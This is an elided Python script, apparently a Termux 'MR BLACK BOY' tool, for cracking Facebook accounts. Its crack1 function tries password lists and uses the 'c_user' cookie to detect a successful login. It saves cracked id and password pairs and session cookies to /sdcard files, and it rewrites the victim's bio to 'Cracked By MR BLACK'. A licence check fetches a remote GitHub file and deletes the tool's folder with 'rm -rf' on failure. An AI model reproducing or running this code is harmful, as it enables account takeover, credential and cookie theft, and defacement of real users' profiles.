...
\033[1;97m═════════════════════════════════════════════
[\033[1;92m✔\033[1;97m]OWNER          \033[1;91m: \033[1;97mMR BLACK BOY
...
[\033[1;92m✔\033[1;97m]TOOL                \033[1;91m: \033[1;97Whatsapp:01301357328
\033[1;97m═════════════════════════════════════════════ """)
def linex():
        print('\x1b[91m══════════════════════════════════════════════')
class jalan:
...
def File():
	...
	print(' \033[1;92m[✔] Saved In MR BLACK-OK.txt,MR BLACK-CP.txt')
	linex()
oks=[]
...
def crack1(idf,pwv):
	...
	#sys.stdout.write(f"\r [MR BLACK] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	#sys.stdout.flush()
	sys.stdout.write('\r\033[1;37m [MR BLACK] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[MR BLACK-OK] '+idf+'|'+pw)
				open('/sdcard/MR BLACK-OK.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"Cracked By MR BLACK (MR BLACK TERMUX ZONE')"}
				...
				open('/sdcard/MR BLACK-KOKI.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' \x1b[38;5;208m[MR BLACK-CP] '+idf+'|'+pw)
				open('/sdcard/MR BLACK-CP.txt','a').write(idf+'|'+pw+'\n')
				break
...
def ckk():
	mod = "SaiMu"
	peo = requests.get('https://github.com/mdmirajkhanmiraj505/MR_BLACK_BOY/blob/main/Miraj1S.txt').text
	if mod in peo:
		File()
	else:
		os.system('rm -rf MR-BLACK-BOY')
		exit()
